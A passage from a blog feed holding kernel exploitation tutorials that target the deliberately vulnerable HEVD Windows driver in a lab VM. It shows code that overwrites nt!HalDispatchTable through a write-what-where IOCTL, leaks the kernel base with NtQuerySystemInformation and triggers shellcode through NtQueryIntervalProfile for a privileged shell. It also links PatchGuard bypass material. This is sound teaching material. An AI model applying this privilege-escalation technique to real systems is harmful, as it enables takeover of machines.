+&lt;span class="n"&gt;HANDLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hDevice&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CreateFileA&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\\\\&lt;/span&gt;&lt;span class="s"&gt;.&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;HackSysExtremeVulnerableDriver&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...);&lt;/span&gt;
+
+&lt;span class="c1"&gt;// Also prepare our shellcode in userland&lt;/span&gt;
+&lt;span class="n"&gt;ULONG_PTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpShellcode&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AllocatePageWithShellcode&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And when sending the IOCTL, pass in a buffer of 2 ULONG_PTR (index 0 is the
+&lt;em&gt;What&lt;/em&gt;, 1 is the &lt;em&gt;Where&lt;/em&gt;).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;// Overwrite the 1st DWORD pointed by WHERE&lt;/span&gt;
+&lt;span class="n"&gt;ULONG_PTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpBufferIn&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;WHAT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;WHERE&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
+&lt;span class="n"&gt;DeviceIoControl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hDevice&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IOCTL_HEVD_ARBITRARY_OVERWRITE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpBufferIn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lpBufferIn&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...);&lt;/span&gt;
+
+&lt;span class="c1"&gt;// Overwrite the 2nd DWORD pointed by WHERE&lt;/span&gt;
+&lt;span class="n"&gt;lpBufferIn&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;WHAT&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;WHERE&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
+&lt;span class="n"&gt;DeviceIoControl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hDevice&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IOCTL_HEVD_ARBITRARY_OVERWRITE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpBufferIn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lpBufferIn&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And if we test with dummy values:
+&lt;img alt="exploit-test" src="/assets/images/win-kernel-debug/hevd-www-testing-exploit.png"&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;WHAT&lt;/code&gt; corresponds to our shellcode (&lt;code&gt;lpShellcode&lt;/code&gt;), which we know. Now we need the
+&lt;code&gt;WHERE&lt;/code&gt; (i.e. &lt;code&gt;nt!HalDispatchTable[1]&lt;/code&gt;)... which a kernel address! As we know, any
+mapped address can be translated to &lt;code&gt;MmappedAddress = ImageBase + offset&lt;/code&gt;.&lt;/p&gt;
+&lt;h2&gt;Get the Kernel Image Base Address from undocumented SystemInformationClass&lt;/h2&gt;
+&lt;p&gt;By reading &lt;a href="https://recon.cx/2013/slides/Recon2013-Alex%20Ionescu-I%20got%2099%20problems%20but%20a%20kernel%20pointer%20ain%27t%20one.pdf"&gt;Alex Ionescu - I got 99 problems but a kernel pointer ain't one (REcon 2013)&lt;/a&gt; I discovered that by passing a System Information Class of &lt;a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/class.htm"&gt;&lt;code&gt;SystemModuleInformation&lt;/code&gt; (0xb)&lt;/a&gt; to &lt;a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724509(v=vs.85).aspx"&gt;&lt;code&gt;NtQuerySystemInformation&lt;/code&gt;&lt;/a&gt;, Windows will leak all kernel modules information (full path, image base address, etc.), including the kernel itself! So finding the image base of the kernel &lt;code&gt;ntoskrnl.exe&lt;/code&gt; can be done as follow (in very approximate pseudo-code - just to give an idea):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#define SystemModuleInformation  (SYSTEM_INFORMATION_CLASS)0xb&lt;/span&gt;
+
+&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;malloc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x100000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;NtQuerySystemInformation&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SystemModuleInformation&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x100000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...);&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;NT_SUCCESS&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;NumberOfModules&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strstr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;FullPathName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ntoskrnl.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Found Kernel as Module[%d] -&amp;gt; %s (%p)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;FullPathName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;ImageBase&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;KernelImageBaseAddress&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;ImageBase&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;All structures used are very well defined and documented in the &lt;a href="http://processhacker.sourceforge.net/doc/ntldr_8h_source.html#l00511"&gt;&lt;code&gt;Process Hacker tool source code&lt;/code&gt;&lt;/a&gt;. If you go with your implementation of the exploit, you might want to read that first.&lt;/p&gt;
+&lt;p&gt;Now we've got the &lt;code&gt;ImageBase&lt;/code&gt; component.&lt;/p&gt;
+&lt;h2&gt;Get the offset from the kernel image&lt;/h2&gt;
+&lt;p&gt;This step is actually much easier. All we need to do is to :&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;load the kernel image &lt;code&gt;ntoskrnl.exe&lt;/code&gt; and store its base address&lt;/li&gt;
+&lt;li&gt;retrieve the address of &lt;code&gt;HalDispatchTable&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;subtract the two pointers found above&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Or again, in very pseudo-C:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;HMODULE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hNtosMod&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LoadLibrary&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ntoskrnl.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;ULONG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lNtHalDispatchTableOffset&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ULONG&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;GetProcAddress&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hNtosMod&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;HalDispatchTable&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ULONG&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;hNtosMod&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And yeah, that's all! Now that we've also got the offset, we know that
+&lt;code&gt;HalDispatchTableInKernel = KernelImageBaseAddress + lNtHalDispatchTableOffset&lt;/code&gt;,
+which is the &lt;code&gt;WHERE&lt;/code&gt; condition we needed above! Therefore, we have everything to
+overwrite &lt;code&gt;nt!HalDispatchTable[1]&lt;/code&gt;.&lt;/p&gt;
+&lt;h2&gt;Triggering the corrupted HAL entry&lt;/h2&gt;
+&lt;p&gt;Now that we've successfully overwritten the &lt;code&gt;HalDispatchTable&lt;/code&gt;, we need a way
+to force a call to the corrupted pointer in &lt;code&gt;nt!HalDispatchTable[1]&lt;/code&gt;.
+As aforementioned, that can be done with the undocumented
+&lt;code&gt;nt!NtQueryIntervalProfile&lt;/code&gt;. So the last piece of our exploit can be written
+as simply as&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;NtQueryIntervalProfile&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;GetProcAddress&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;GetModuleHandle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TEXT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ntdll.dll&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
+&lt;span class="n"&gt;ULONG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dummy1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dummy2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="n"&gt;NtQueryIntervalProfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dummy1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;dummy2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Assembling all the pieces&lt;/h2&gt;
+&lt;p&gt;The clean final exploit can be found &lt;a href="https://github.com/hugsy/hevd/blob/c04e46ababbb78913ef228c31389370f17d8e48a/ArbitraryOverwrite/exploit.c"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/hevd-www-final-exploit.png"&gt;&lt;/p&gt;
+&lt;p&gt;You can now enjoy the privileged shell so well deserved!&lt;/p&gt;
+&lt;h2&gt;About PatchGuard&lt;/h2&gt;
+&lt;p&gt;Windows XP/2003 and up use
+&lt;a href="https://en.wikipedia.org/wiki/Kernel_Patch_Protection"&gt;Kernel Patch Protection (aka PatchGuard)&lt;/a&gt; to
+protect sensitive locations, including the SSDT and HAL (among other). Since this
+technique will modify the HAL table, PG will detect it and force a&lt;/p&gt;
+&lt;p&gt;Although PG bypass is not the subject of this post, it should be noted that
+&lt;a href="http://uninformed.org/index.cgi?v=3&amp;amp;a=3&amp;amp;p=7"&gt;several&lt;/a&gt; &lt;a href="http://uninformed.org/index.cgi?v=6&amp;amp;a=1&amp;amp;p=25"&gt;public&lt;/a&gt; &lt;a href="https://web.archive.org/web/20180312140501/http://fyyre.ru/vault/bootloader_v2.txt"&gt;papers&lt;/a&gt; and &lt;a href="https://github.com/hfiref0x/UPGDSED"&gt;tools&lt;/a&gt; cover ways to bypass it.&lt;/p&gt;
+&lt;h1&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;In this chapter we've covered how to exploit Arbitrary Write conditions in the kernel to achieve code execution, by leveraging undocumented procedures and functions that leak valuable kernel information straight from userland. Many more leaks exist, and I definitely recommend watching &lt;a class="fa fa-twitter" href="https://twitter.com/aionescu" target="_blank"&gt;@aionescu&lt;/a&gt;'s REcon 2013 talk &lt;a href="https://www.youtube.com/watch?v=5HbmpPBKVFg"&gt;I got 99 problems but a kernel pointer ain't one&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;See you next time ✌&lt;/p&gt;
+&lt;h2&gt;Related links&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href="https://www.coresecurity.com/core-labs/articles/abusing-gdi-for-ring0-exploit-primitives"&gt;Abusing GDI for Ring0 exploit primitives&lt;/a&gt;:
+    Another interesting way to exploit WWW conditions by Diego Juarez through GDI&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.agner.org/optimize/calling_conventions.pdf"&gt;Calling conventions for different C++ compilers and operating systems&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.geoffchappell.com/studies/windows/km"&gt;An excellent reference of Windows internal structures by Geoff Chappell&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://uninformed.org/index.cgi?v=3&amp;amp;a=3&amp;amp;p=9"&gt;Uninformed - PatchGuard &amp;amp; SSDT&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://dl.packetstormsecurity.net/papers/bypass/NES-BypassWin7KernelAslr.pdf"&gt;Bypassing Windows 7 Kernel ASLR&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;</content><category term="tutorial"></category><category term="pwn"></category><category term="windows"></category><category term="hevd"></category><category term="kernel"></category><category term="write-what-where"></category></entry><entry><title>First exploit in Windows Kernel (HEVD)</title><link href="https://blahcat.github.io/posts/2017/08/18/first-exploit-in-windows-kernel-hevd.html" rel="alternate"></link><published>2017-08-18T00:00:00-07:00</published><updated>2017-08-18T00:00:00-07:00</updated><author><name>hugsy</name></author><id>tag:blahcat.github.io,2017-08-18:/posts/2017/08/18/first-exploit-in-windows-kernel-hevd.html</id><summary type="html">&lt;p&gt;Hi there ✋&lt;/p&gt;
+&lt;p&gt;This post is the third chapter of this series, where we dive into Windows
+kernel. The previous posts introduced respectively how to painlessly setup a
+Windows exploit lab, then how to create a custom shellcode for the kernel to
+execute.&lt;/p&gt;
+&lt;p&gt;So now we need vulnerabilities to get control …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hi there ✋&lt;/p&gt;
+&lt;p&gt;This post is the third chapter of this series, where we dive into Windows
+kernel. The previous posts introduced respectively how to painlessly setup a
+Windows exploit lab, then how to create a custom shellcode for the kernel to
+execute.&lt;/p&gt;
+&lt;p&gt;So now we need vulnerabilities to get control of the program counter (RIP since
+we only focus on x64). For that, we'll use the most awesome &lt;strong&gt;Extremely
+Vulnerable Driver&lt;/strong&gt;.&lt;/p&gt;
+&lt;h1&gt;Setup&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver"&gt;HackSys Extremely Vulnerable Driver&lt;/a&gt; is
+a Windows driver for x86 and x64 created by
+the HackSys Team (huge props!). Once injected
+into Windows, this driver purposely offers several types of vulnerabilities, to
+help us practice on them and/or assist us developing new exploitation techniques.&lt;/p&gt;
+&lt;h2&gt;On the Windows 8.1 x64 debuggee VM&lt;/h2&gt;
+&lt;p&gt;Download and unzip in the Windows 8.1 x64 debuggee VM:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.osronline.com/article.cfm?article=157"&gt;OSR Driver Loader&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases/download/v1.20/HEVD.1.20.zip"&gt;HackSys Extremely Vulnerable Driver&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Then simply run the &lt;code&gt;OSR Driver Loader&lt;/code&gt; and register the AMD64 version of
+&lt;code&gt;HEVD.sys&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/register-hevd.png"&gt;&lt;/p&gt;
+&lt;p&gt;You can then start the service.&lt;/p&gt;
+&lt;p&gt;But what about the kernel driver signing policy you may ask from Windows Vista
+and up? Good point: well in Debug mode, unless
+&lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/installing-an-unsigned-driver-during-development-and-test#a-href-idenforcing-kernel-mode-signature-verification-in-kernel-debugging-modea-enforcing-kernel-mode-signature-verification-in-kernel-debugging-mode"&gt;explicitly stated otherwise via the registry&lt;/a&gt;
+the MSDN states that&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Attaching an active kernel debugger to a development or test computer disables
+load-time signature enforcement for kernel-mode drivers.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;So we're good here, let's proceed...&lt;/p&gt;
+&lt;h2&gt;On the Windows debugger VM&lt;/h2&gt;
+&lt;p&gt;The AMD64 directory of HEVD contains the PDB symbols that WinDbg
+will use for extra information, so copy this PDB into a &lt;code&gt;hevd.pdb&lt;/code&gt; directory
+located within one of the path defined in the &lt;code&gt;_NT_SYMBOL_PATH&lt;/code&gt; environment
+variable. For example like this (you might need to adjust to your own
+configuration):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_NT_SYMBOL_PATH&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;_NT_SYMBOL_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;SRV&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;\&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;msdl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;microsoft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;download&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mkdir&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;\&lt;span class="n"&gt;symbols&lt;/span&gt;\&lt;span class="n"&gt;hevd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pdb&lt;/span&gt;
+&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mkdir&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;\&lt;span class="n"&gt;syms&lt;/span&gt;\&lt;span class="n"&gt;hevd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pdb&lt;/span&gt;\&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;F6551A1E31E4F65B536C8DCB40F999B1&lt;/span&gt;
